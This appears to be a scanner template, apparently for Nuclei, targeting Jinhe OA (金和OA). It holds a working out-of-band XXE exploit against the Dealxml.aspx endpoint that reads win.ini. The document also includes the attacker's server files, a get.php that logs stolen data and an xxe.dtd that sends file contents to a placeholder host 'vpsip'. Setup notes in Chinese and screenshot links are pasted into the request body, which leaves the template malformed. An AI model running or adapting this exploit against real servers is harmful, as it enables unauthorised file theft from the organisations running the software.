    fofa: app="金和网络-金和OA"
http:
- raw:
  - 'POST /c6/JHSoft.Web.Appraise/Dealxml.aspx/ HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/2.0 (compatible; MSIE 3.01; Windows 95

    Accept-Encoding: gzip, deflate

    Accept: */*

    Connection: close

    Content-Type: application/Xml


    <?xml version="1.0"?>

    <!DOCTYPE ANY[

    <!ENTITY % file SYSTEM "file:///C:/Windows/win.ini">

    <!ENTITY % remote SYSTEM "http://vpsip/xxe.dtd">

    %remote;

    %all;

    ]><root>&send;</root>


    VPS准备两个文件


    get.php


    <?php

    $data=$_GET[''file''];

    $myfile = fopen("file.txt", "w+");

    fwrite($myfile, $data);

    fclose($myfile);

    ?>


    xxe.dtd


    <!ENTITY % all "<!ENTITY send SYSTEM ''http://vpsip/get.php?file=%file;''>">


    python开启http服务，发送请求

    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1754121855689-607e9767-1fa6-4247-8147-102b472fb459.png)


    读取的文件内容会回显到VPS


    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1754121855943-74936b7c-0873-4f08-991d-518f3318c16b.png)'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
